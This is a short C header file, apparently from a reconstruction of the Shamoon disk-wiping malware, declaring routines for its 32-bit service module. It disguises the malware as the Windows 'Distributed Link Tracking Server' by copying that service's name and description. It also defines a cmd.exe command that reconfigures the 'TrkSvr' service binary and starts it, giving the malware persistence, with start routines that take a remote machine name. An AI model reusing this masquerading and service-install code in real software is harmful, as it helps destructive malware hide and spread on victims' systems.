// Copyright 2015 Christian Roggia. All rights reserved.
// Use of this source code is governed by an Apache 2.0 license that can be
// found in the LICENSE file.

#include "../Global/Global.h"

namespace Shamoon { namespace Modules { namespace _32bit {
	bool Start32bitService(LPCWSTR lpMachineName, const WCHAR *a2);
	bool Get32bitSpecific(WCHAR *svc_filename, WCHAR *svc_path);
	bool Save32bitModule();
	bool Setup32bitService();
}}}

#define MODULE_32BIT_NAME			L"TrkSvr"
#define MODULE_32BIT_SHORT_DESC		L"Distributed Link Tracking Server"
#define MODULE_32BIT_DETAILED_DESC	\
	L"Enables the Distributed Link Tracking Client service " \
	L"within the same domain to provide more reliable and efficient " \
	L"maintenance of links within the domain. " \
	L"If this service is disabled, " \
	L"any services that explicitly depend on it will fail to start."

#define TRKSRV_CMD \
	L"\\System32\\cmd.exe /c \"" \
	L"ping -n 30 127.0.0.1 >nul && " \
	L"sc config TrkSvr binpath= system32\\trksrv.exe && " \
	L"ping -n 10 127.0.0.1 >nul && " \
	L"sc start TrkSvr \""